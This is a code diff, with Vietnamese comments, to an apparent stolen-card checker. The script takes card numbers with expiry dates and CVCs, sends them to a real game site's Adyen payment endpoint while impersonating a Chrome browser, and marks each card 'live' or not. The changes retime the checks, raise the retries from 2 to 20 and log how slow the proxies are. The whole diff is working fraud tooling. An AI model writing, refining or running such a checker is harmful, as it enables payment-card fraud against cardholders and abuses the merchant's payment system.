@@ -457,7 +457,9 @@ async def check_card_core(line, session_semaphore=None):
     price_val = current_config["price"]
     offer_id = current_config["id"]
 
-    start_time = time.time()
+    # --- [IMPROVED TIME CHECK] ---
+    # Không khởi tạo start_time ở đây nữa để tránh tính thời gian chờ queue
+    
     line = line.strip()
     result = {
         "status": "ERROR",
@@ -469,7 +471,6 @@ async def check_card_core(line, session_semaphore=None):
     if not line: return result
     normalized = normalize_card(line)
     if not normalized: 
-        # Nếu normalize thất bại, trả về lỗi ngay
         return result
         
     cc, mm, yyyy, cvc = normalized.split('|')
@@ -481,13 +482,18 @@ async def check_card_core(line, session_semaphore=None):
 
     if session_semaphore:
         async with session_semaphore:
-            return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time)
+            # Chỉ bắt đầu tính giờ bên trong _execute_check
+            return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id)
     else:
-        return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time)
+        return await _execute_check(cc, mm, yyyy, cvc, price_val, offer_id)
 
-async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
+async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id):
+    # --- [IMPROVED TIME CHECK] ---
+    # Bắt đầu tính giờ tại đây (khi thread thực sự chạy)
+    start_time = time.time()
+    
     retry_count = 0
-    max_retries = 2
+    max_retries = 20
     impersonate_ver = "chrome120"
     
     while retry_count < max_retries:
@@ -559,7 +565,7 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
 
                 resp_pay = await session.post('https://taongafarm.com/payment/adyen/api/checkout/payment', headers=payment_headers, json=payment_json_data, timeout=20)
                 
-                # === [UPDATED] XỬ LÝ LỖI 500 ===
+                # === XỬ LÝ LỖI 500 ===
                 if resp_pay.status_code == 500:
                     end_time = time.time()
                     time_taken = round(end_time - start_time, 2)
@@ -616,8 +622,12 @@ async def _execute_check(cc, mm, yyyy, cvc, price_val, offer_id, start_time):
             retry_count += 1
             await asyncio.sleep(0.5)
             continue
-
-    return {"status": "ERROR", "is_live": False, "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error"}
+    
+    # --- [IMPROVED TIME CHECK] ---
+    # Tính thời gian ngay cả khi lỗi timeout để biết proxy chậm thế nào
+    end_time = time.time()
+    time_taken = round(end_time - start_time, 2)
+    return {"status": "ERROR", "is_live": False, "full_log": f"{cc}|{mm}|{yyyy}|{cvc}|ERROR|Timeout or Network Error - Time: {time_taken}s"}
 
 # ===================================================================
 # === PHẦN 4: LOGIC XỬ LÝ HÀNG LOẠT (NON-BLOCKING)
